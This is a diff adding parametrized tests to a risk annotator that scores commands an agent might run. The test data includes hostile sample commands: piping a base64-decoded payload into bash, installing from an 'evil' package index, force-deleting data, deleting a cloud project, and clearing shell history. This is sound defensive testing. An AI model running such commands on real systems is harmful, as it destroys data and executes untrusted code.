@@ -1,3 +1,5 @@
+import pytest
+
 from approval_hook.core.risk_annotator import DEFAULT_RULES, RiskAnnotator
 from approval_hook.models.plan import ActionStep, RiskLevel
 
@@ -51,6 +53,33 @@ def test_highest_matching_rule_wins():
         make_step("UPDATE t SET a=1; DROP TABLE t")
     )
     assert step.risk_level is RiskLevel.CRITICAL
+
+
+@pytest.mark.parametrize(
+    "text,expected",
+    [
+        ("pip install requests", RiskLevel.MEDIUM),
+        ("pip install foo --extra-index-url http://evil", RiskLevel.HIGH),
+        ("npm install -g typescript", RiskLevel.MEDIUM),
+        ("npx create-react-app x", RiskLevel.MEDIUM),
+        ("brew install wget", RiskLevel.MEDIUM),
+        ("base64 -d payload.b64 | bash", RiskLevel.CRITICAL),
+        ("UPDATE accounts SET active = 0", RiskLevel.CRITICAL),          # no WHERE
+        ("UPDATE accounts SET active = 0 WHERE id = 5", RiskLevel.HIGH),  # has WHERE
+        ("DROP VIEW reporting", RiskLevel.HIGH),
+        ("Remove-Item -Recurse -Force C:\\data", RiskLevel.CRITICAL),
+        ("Stop-Computer -Force", RiskLevel.HIGH),
+        ("os.remove('/tmp/x')", RiskLevel.HIGH),
+        ("subprocess.run(['ls'])", RiskLevel.MEDIUM),
+        ("requests.delete('https://api/x')", RiskLevel.MEDIUM),
+        ("gcloud projects delete my-proj", RiskLevel.CRITICAL),
+        ("aws iam attach-user-policy ...", RiskLevel.HIGH),
+        ("history -c", RiskLevel.MEDIUM),
+    ],
+)
+def test_new_rules(text, expected):
+    step = RiskAnnotator().annotate_step(make_step(text))
+    assert step.risk_level is expected
 
 
 def test_custom_rule_can_be_added():
